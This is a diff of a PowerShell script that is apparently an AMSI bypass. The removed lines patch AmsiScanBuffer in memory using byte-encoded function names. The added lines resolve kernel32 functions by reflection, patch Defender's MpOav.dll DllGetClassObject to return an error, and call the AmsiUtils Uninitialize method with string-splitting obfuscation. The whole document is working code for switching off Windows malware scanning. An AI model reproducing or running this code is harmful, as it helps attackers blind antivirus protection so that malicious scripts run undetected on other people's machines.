@@ -1,24 +1,71 @@
-$c = 't'
-$Win32 = @"
-using System.Runtime.InteropServices;
-using System;
-public class Win32 {
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport("kernel32")]
-public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    # Return the address of the function
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 }
-"@
-Add-Type $Win32
-$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
-$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
-$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
-$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
-$notp = 0
-$replace = 'VirtualProtec'
-[Win32]::('{0}{1}' -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
-$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
-$marshalClass = [System.Runtime.InteropServices.Marshal]
-$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+    Write-Output $TypeBuilder.CreateType()
+}
+$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
+$LoadLibraryDelegate)
+$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
+$GetProcAddressDelegate)
+$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
+$VirtualProtectDelegate)
+
+$hModule = $LoadLibrary.Invoke("MpOav.dll")
+$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
+"DllGetClassObject")
+$p = 0
+$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) 
+$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
+$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
+$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null) 
+
